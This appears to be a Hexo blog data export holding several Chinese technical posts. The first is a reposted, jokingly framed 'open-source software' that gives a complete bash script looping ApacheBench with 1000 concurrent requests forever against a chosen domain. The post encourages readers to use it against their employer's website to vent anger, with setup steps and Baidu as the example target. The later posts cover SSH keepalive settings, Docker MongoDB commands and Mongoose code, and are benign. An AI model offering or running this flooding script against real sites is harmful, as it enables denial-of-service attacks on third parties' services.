<strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"转-BOSS开源软件-一-：黑客帝国之持久进攻\"><a href=\"#转-BOSS开源软件-一-：黑客帝国之持久进攻\" class=\"headerlink\" title=\"[转]BOSS开源软件(一)：黑客帝国之持久进攻\"></a>[转]<a href=\"https://user.qzone.qq.com/525150008\" target=\"_blank\" rel=\"noopener\">BOSS开源软件(一)：黑客帝国之持久进攻</a></h1><p> <strong>使用说明：</strong>\\<br>（1）该软件属于中华人民共和国的法定危险品，请谨慎使用。\\<br>（2）该软件的推荐使用范围仅限于：对公司或上级领导不满，且不便于和他们多度交流时，可使公司相关的网站作为个人情绪的发泄对象。切不可伤害无辜。\\<br>（3）声明：切不可把该软件作为凌弱之手段，切不可伤害无辜。\\<br>（4）如果您多度使用而进了那个地方，这一切都是您刻苦钻研自学成才之结果，皆与本人无关。\\<br>（5）该软件目前只支持Linux操作系统和苹果OSX操作系统，若需要Windows版本的，请自行研发。\\<br>（6）软件使用者自感为黑客，且不熟悉Linux或OSX的，官方推荐：您还是早点投胎去吧，上帝会原谅您的过错的！</p>\n<p>代码：\\<br>(1) 打开Linux终端或OSX终端，新建文件<code>h.sh</code> \\<br>(2) 编辑文件<code>h.sh</code>，并保存。代码内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># 注释：下面变量DOMAIN可以修改成你需要的网站域名 </span><br><span class=\"line\">DOMAIN=&quot;http://www.yourdomain.com/&quot;</span><br><span class=\"line\">COUNT=1000</span><br><span class=\"line\">while true</span><br><span class=\"line\">do</span><br><span class=\"line\">    ab -c $COUNT -n  $COUNT $DOMAIN</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure></p>\n<p>(3) 添加h.sh的执行权限，输入命令：<code>chmod +x h.sh</code>\\<br>(4) 执行软件，输入命令：<code>./h.sh</code></p>\n<h3 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h3><ol>\n<li><p>如果系统提示找不到<code>ab</code>命令时，您需要自行安装<code>ApacheWeb</code>服务器。</p>\n<p> （1）在如CentOS/Fedora等Linux操作系统，输入命令：sudo yum install httpd</p>\n<p> （2）在如Ubuntu等Linux操作系统，输入命令：sudo apt-get install httpd</p>\n<p> （3）在苹果OSX，只需在官方下载相应的安装包进行安装即可</p>\n</li>\n<li><p>您修改代码的DOMAIN变量却会不断出现类似于帮助的信息时，请先按Ctrl+C终止当前执行进程，检查DOMAIN格式是否正确。</p>\n<p> 例如：我们设置DOMAIN为百度，我们必需写成<br> <code>http://www.baidu.com/</code>(注意反斜杠)，而不能<code>www.baidu.com</code>或<code>http://www.baidu.com</code></p>\n</li>\n<li><p>如果您已经满足使用该软件的效果，请及时停止使用，按Ctrl+C终止该软件。</p>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>我们欢迎使用该软件在有限范围内用于发泄个人的不良情绪。</p>\n<p>但我们需要再次提示：</p>\n<p>该软件属于中华人民共和国的法定危险品，请谨慎使用。</p>\n"},{"title":"解决SSH登录自动断开","date":"2018-08-08T07:03:51.000Z","_content":"## [CentOS解决SSH自动断开](https://blog.csdn.net/moliyiran/article/details/54809090)\n````\necho \"ClientAliveInterval 60\" >> /etc/ssh/sshd_config\necho \"ClientAliveCountMax 1\" >> /etc/ssh/sshd_config\n````\n重启SSH服务\n\n> service sshd restart\n\n\n## [Ubuntu解决SSH自动断线](https://www.jianshu.com/p/f8d9f28b830e)\n\n\n**1、依赖ssh客户端定时发送心跳检测**\n> vim /etc/ssh_config\n````\n// 末尾添加\n\nServerAliveInterval 20\n\nServerAliveCountMax 999\n````\n每隔20秒向服务器发出一次心跳检测，若超过999次请求都没有成功，就主动断开与服务器端的连接。\n\n**2、依赖ssh服务器端定时发送心跳检测**\n> vim /etc/sshd_config // 注意两文件不同\n````\n// 末尾添加\n\nClientAliveInterval 30\n\nClientAliveCountMax 6\n````\n每隔30秒向客户端发出一次心跳检测，若超过6次请求都没有成功，就会主动断开与客户端的连接。\n\n**3、设置ssh心跳检测后，重启ssh服务生效**\n> service ssh restart\n\n","source":"_posts/Operating System/UnixLike/Linux/解决SSH自动断开-心跳检测.md","raw":"---\ntitle: 解决SSH登录自动断开\ndate: 2018-08-08 15:03:51\ntags: 心跳检测\ncategories: SSH\n---\n## [CentOS解决SSH自动断开](https://blog.csdn.net/moliyiran/article/details/54809090)\n````\necho \"ClientAliveInterval 60\" >> /etc/ssh/sshd_config\necho \"ClientAliveCountMax 1\" >> /etc/ssh/sshd_config\n````\n重启SSH服务\n\n> service sshd restart\n\n\n## [Ubuntu解决SSH自动断线](https://www.jianshu.com/p/f8d9f28b830e)\n\n\n**1、依赖ssh客户端定时发送心跳检测**\n> vim /etc/ssh_config\n````\n// 末尾添加\n\nServerAliveInterval 20\n\nServerAliveCountMax 999\n````\n每隔20秒向服务器发出一次心跳检测，若超过999次请求都没有成功，就主动断开与服务器端的连接。\n\n**2、依赖ssh服务器端定时发送心跳检测**\n> vim /etc/sshd_config // 注意两文件不同\n````\n// 末尾添加\n\nClientAliveInterval 30\n\nClientAliveCountMax 6\n````\n每隔30秒向客户端发出一次心跳检测，若超过6次请求都没有成功，就会主动断开与客户端的连接。\n\n**3、设置ssh心跳检测后，重启ssh服务生效**\n> service ssh restart\n\n","slug":"Operating System/UnixLike/Linux/解决SSH自动断开-心跳检测","published":1,"updated":"2018-09-05T06:33:18.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3h00fozodvlfvk4vlb","content":"<h2 id=\"CentOS解决SSH自动断开\"><a href=\"#CentOS解决SSH自动断开\" class=\"headerlink\" title=\"CentOS解决SSH自动断开\"></a><a href=\"https://blog.csdn.net/moliyiran/article/details/54809090\" target=\"_blank\" rel=\"noopener\">CentOS解决SSH自动断开</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ClientAliveInterval 60&quot; &gt;&gt; /etc/ssh/sshd_config</span><br><span class=\"line\">echo &quot;ClientAliveCountMax 1&quot; &gt;&gt; /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n<p>重启SSH服务</p>\n<blockquote>\n<p>service sshd restart</p>\n</blockquote>\n<h2 id=\"Ubuntu解决SSH自动断线\"><a href=\"#Ubuntu解决SSH自动断线\" class=\"headerlink\" title=\"Ubuntu解决SSH自动断线\"></a><a href=\"https://www.jianshu.com/p/f8d9f28b830e\" target=\"_blank\" rel=\"noopener\">Ubuntu解决SSH自动断线</a></h2><p><strong>1、依赖ssh客户端定时发送心跳检测</strong></p>\n<blockquote>\n<p>vim /etc/ssh_config<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 末尾添加</span><br><span class=\"line\"></span><br><span class=\"line\">ServerAliveInterval 20</span><br><span class=\"line\"></span><br><span class=\"line\">ServerAliveCountMax 999</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>每隔20秒向服务器发出一次心跳检测，若超过999次请求都没有成功，就主动断开与服务器端的连接。</p>\n<p><strong>2、依赖ssh服务器端定时发送心跳检测</strong></p>\n<blockquote>\n<p>vim /etc/sshd_config // 注意两文件不同<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 末尾添加</span><br><span class=\"line\"></span><br><span class=\"line\">ClientAliveInterval 30</span><br><span class=\"line\"></span><br><span class=\"line\">ClientAliveCountMax 6</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>每隔30秒向客户端发出一次心跳检测，若超过6次请求都没有成功，就会主动断开与客户端的连接。</p>\n<p><strong>3、设置ssh心跳检测后，重启ssh服务生效</strong></p>\n<blockquote>\n<p>service ssh restart</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"CentOS解决SSH自动断开\"><a href=\"#CentOS解决SSH自动断开\" class=\"headerlink\" title=\"CentOS解决SSH自动断开\"></a><a href=\"https://blog.csdn.net/moliyiran/article/details/54809090\" target=\"_blank\" rel=\"noopener\">CentOS解决SSH自动断开</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ClientAliveInterval 60&quot; &gt;&gt; /etc/ssh/sshd_config</span><br><span class=\"line\">echo &quot;ClientAliveCountMax 1&quot; &gt;&gt; /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n<p>重启SSH服务</p>\n<blockquote>\n<p>service sshd restart</p>\n</blockquote>\n<h2 id=\"Ubuntu解决SSH自动断线\"><a href=\"#Ubuntu解决SSH自动断线\" class=\"headerlink\" title=\"Ubuntu解决SSH自动断线\"></a><a href=\"https://www.jianshu.com/p/f8d9f28b830e\" target=\"_blank\" rel=\"noopener\">Ubuntu解决SSH自动断线</a></h2><p><strong>1、依赖ssh客户端定时发送心跳检测</strong></p>\n<blockquote>\n<p>vim /etc/ssh_config<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 末尾添加</span><br><span class=\"line\"></span><br><span class=\"line\">ServerAliveInterval 20</span><br><span class=\"line\"></span><br><span class=\"line\">ServerAliveCountMax 999</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>每隔20秒向服务器发出一次心跳检测，若超过999次请求都没有成功，就主动断开与服务器端的连接。</p>\n<p><strong>2、依赖ssh服务器端定时发送心跳检测</strong></p>\n<blockquote>\n<p>vim /etc/sshd_config // 注意两文件不同<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 末尾添加</span><br><span class=\"line\"></span><br><span class=\"line\">ClientAliveInterval 30</span><br><span class=\"line\"></span><br><span class=\"line\">ClientAliveCountMax 6</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>每隔30秒向客户端发出一次心跳检测，若超过6次请求都没有成功，就会主动断开与客户端的连接。</p>\n<p><strong>3、设置ssh心跳检测后，重启ssh服务生效</strong></p>\n<blockquote>\n<p>service ssh restart</p>\n</blockquote>\n"},{"title":"Docker-mongo","date":"2018-07-26T07:24:19.000Z","_content":"## Docker下的mongo操作\nDockerShell访问和查看MongoDB日志\ndocker exec命令允许您在docker容器中运行命令。下面的命令行将在mongo容器中为您提供一个bash shell:\n> docker ps // 查看`docker进程管理器`获得进程`NAMES`\n> $ docker exec -it [some-mongo] bash\n\nThe MongoDB Server log is available through Docker's container log:\n> $ docker logs [some-mongo]\n---\n[原文连接](https://hub.docker.com/_/mongo/)\n","source":"_posts/SQL/NoSql/MongoDB/Docker-mongo.md","raw":"---\ntitle: Docker-mongo\ndate: 2018-07-26 15:24:19\ntags: Docker-mongo\ncategories: Docker-mongo\n---\n## Docker下的mongo操作\nDockerShell访问和查看MongoDB日志\ndocker exec命令允许您在docker容器中运行命令。下面的命令行将在mongo容器中为您提供一个bash shell:\n> docker ps // 查看`docker进程管理器`获得进程`NAMES`\n> $ docker exec -it [some-mongo] bash\n\nThe MongoDB Server log is available through Docker's container log:\n> $ docker logs [some-mongo]\n---\n[原文连接](https://hub.docker.com/_/mongo/)\n","slug":"SQL/NoSql/MongoDB/Docker-mongo","published":1,"updated":"2018-09-05T06:33:18.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3j00fszodvl8nz4pop","content":"<h2 id=\"Docker下的mongo操作\"><a href=\"#Docker下的mongo操作\" class=\"headerlink\" title=\"Docker下的mongo操作\"></a>Docker下的mongo操作</h2><p>DockerShell访问和查看MongoDB日志<br>docker exec命令允许您在docker容器中运行命令。下面的命令行将在mongo容器中为您提供一个bash shell:</p>\n<blockquote>\n<p>docker ps // 查看<code>docker进程管理器</code>获得进程<code>NAMES</code><br>$ docker exec -it [some-mongo] bash</p>\n</blockquote>\n<p>The MongoDB Server log is available through Docker’s container log:</p>\n<h2 id=\"gt-docker-logs-some-mongo\"><a href=\"#gt-docker-logs-some-mongo\" class=\"headerlink\" title=\"&gt; $ docker logs [some-mongo]\"></a>&gt; $ docker logs [some-mongo]</h2><p><a href=\"https://hub.docker.com/_/mongo/\" target=\"_blank\" rel=\"noopener\">原文连接</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Docker下的mongo操作\"><a href=\"#Docker下的mongo操作\" class=\"headerlink\" title=\"Docker下的mongo操作\"></a>Docker下的mongo操作</h2><p>DockerShell访问和查看MongoDB日志<br>docker exec命令允许您在docker容器中运行命令。下面的命令行将在mongo容器中为您提供一个bash shell:</p>\n<blockquote>\n<p>docker ps // 查看<code>docker进程管理器</code>获得进程<code>NAMES</code><br>$ docker exec -it [some-mongo] bash</p>\n</blockquote>\n<p>The MongoDB Server log is available through Docker’s container log:</p>\n<h2 id=\"gt-docker-logs-some-mongo\"><a href=\"#gt-docker-logs-some-mongo\" class=\"headerlink\" title=\"&gt; $ docker logs [some-mongo]\"></a>&gt; $ docker logs [some-mongo]</h2><p><a href=\"https://hub.docker.com/_/mongo/\" target=\"_blank\" rel=\"noopener\">原文连接</a></p>\n"},{"title":"MongoDB在Node.js中的使用","date":"2018-04-16T06:03:08.000Z","archives":"SQL","_content":"### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n## Mongoose\nMongoose是MongoDB的一个对象模型工具，是基于node-mongodb-native开发的MongoDB nodejs驱动，可以在异步的环境下执行。\n\n同时它也是针对MongoDB操作的一个对象模型库，封装了MongoDB对文档的的一些增删改查等常用方法，让NodeJS操作Mongodb数据库变得更加灵活简单。\n\n我们通过Mongoose去创建一个“集合”并对其进行增删改查，就要用到它的三个属性：Schema(数据属性模型)、Model、Entity\n\n### 定义一个Schema\n````\nvar mongoose = require(\"mongoose\");\n \nvar TestSchema = new mongoose.Schema({\n    name : { type:String },//属性name,类型为String\n    age  : { type:Number, default:0 },//属性age,类型为Number,默认为0\n    time : { type:Date, default:Date.now },\n    email: { type:String,default:''}\n});\n````\n[阅读原文](https://www.cnblogs.com/Leo_wl/p/4361289.html)\n\n---","source":"_posts/SQL/NoSql/MongoDB/MongoDB-Node.js中的使用.md","raw":"---\ntitle: MongoDB在Node.js中的使用\ndate: 2018-04-16 14:03:08\ntags: MongoDB\narchives: SQL\ncategories: 数据库\n---\n### Node.js 中使用MongoDB(几乎是标配)\n+ mac中安装MongoDB\nbrew install mongodb\n+ node.js 中使用mongoose第三方库来管理MongoDB\nnpm install mongoose --save\n- 为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async\n\n* 配置连接DB信息,并导出连接的对象\n````\nimport mongoose from 'mongoose' // 引入\nconst options = {\n  user: 'admin',\n  pwd: '123456',\n  host: 'localhost',\n  port: '27017',\n  database: 'hollywood',\n  authSource: 'admin',\n}\n\nconst uri = `mongodb://${options.user}:${options.pwd}@${options.host}:${options.port}/${options.database}?authSource=${options.authSource}`\n\nmongoose.Promise = global.Promise //需要\nmongoose.connect(uri)\n\nexport default mongoose\n````\n\n**定义一个模型的概要，类似于关系型数据库中的定义表结构**\n\n````\nimport db from '../db.js'\nimport logger from '../logger'\nconst Schema = db.Schema\n\n//account对应的字段\nconst accountSchema = new Schema(\n  {\n    name: { type: String, maxlength: 15 },\n    password: { type: String, maxlength: 20 },\n    gender: { type: String, enum: ['male', 'female'] },\n    email: { type: String, maxlength: 25 },\n    avatar: { type: String },\n    age: { type: Number },\n    create_date: { type: Date },\n    update_date: { type: Date },\n  },\n  {\n    versionKey: false,\n  },\n)\n\n//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)\naccountSchema.pre('save', function(next) {\nconst currentDate = new Date()\nif (!this.create_date) {\n        this.create_date = currentDate\n} else {\n        this.update_date = currentDate\n}\nnext()\n})\n\n//当account执行save()后\n> ...\n\n//定义模型的方法\naccountSchema.methods.sayHi = () => (console.log('sayHi()!!!!!'))\nconst Account = db.model('Account', accountSchema)\nexport default Account\n\n````\n**保存到数据库, 并返回一个保存到数据库的对象**\n\n````\nimport Account from './model'\n\nexport default class AccountService {\n  static async save(json) {\n    const accountModel = new Account(json)\n    const account = await accountModel.save()\n    return account\n  }\n}\n````\n\n## Mongoose\nMongoose是MongoDB的一个对象模型工具，是基于node-mongodb-native开发的MongoDB nodejs驱动，可以在异步的环境下执行。\n\n同时它也是针对MongoDB操作的一个对象模型库，封装了MongoDB对文档的的一些增删改查等常用方法，让NodeJS操作Mongodb数据库变得更加灵活简单。\n\n我们通过Mongoose去创建一个“集合”并对其进行增删改查，就要用到它的三个属性：Schema(数据属性模型)、Model、Entity\n\n### 定义一个Schema\n````\nvar mongoose = require(\"mongoose\");\n \nvar TestSchema = new mongoose.Schema({\n    name : { type:String },//属性name,类型为String\n    age  : { type:Number, default:0 },//属性age,类型为Number,默认为0\n    time : { type:Date, default:Date.now },\n    email: { type:String,default:''}\n});\n````\n[阅读原文](https://www.cnblogs.com/Leo_wl/p/4361289.html)\n\n---","slug":"SQL/NoSql/MongoDB/MongoDB-Node.js中的使用","published":1,"updated":"2018-09-05T06:33:18.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3l00fuzodvhhif8kmv","content":"<h3 id=\"Node-js-中使用MongoDB-几乎是标配\"><a href=\"#Node-js-中使用MongoDB-几乎是标配\" class=\"headerlink\" title=\"Node.js 中使用MongoDB(几乎是标配)\"></a>Node.js 中使用MongoDB(几乎是标配)</h3><ul>\n<li>mac中安装MongoDB<br>brew install mongodb</li>\n<li>node.js 中使用mongoose第三方库来管理MongoDB<br>npm install mongoose –save</li>\n</ul>\n<ul>\n<li>为什么使用mongoose:官方的驱动都是 回调方式的API, 而mongoose封装成promise, 可使用await/async</li>\n</ul>\n<ul>\n<li>配置连接DB信息,并导出连接的对象<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import mongoose from &apos;mongoose&apos; // 引入</span><br><span class=\"line\">const options = &#123;</span><br><span class=\"line\">  user: &apos;admin&apos;,</span><br><span class=\"line\">  pwd: &apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h2><p>Mongoose是MongoDB的一个对象模型工具，是基于node-mongodb-native开发的MongoDB 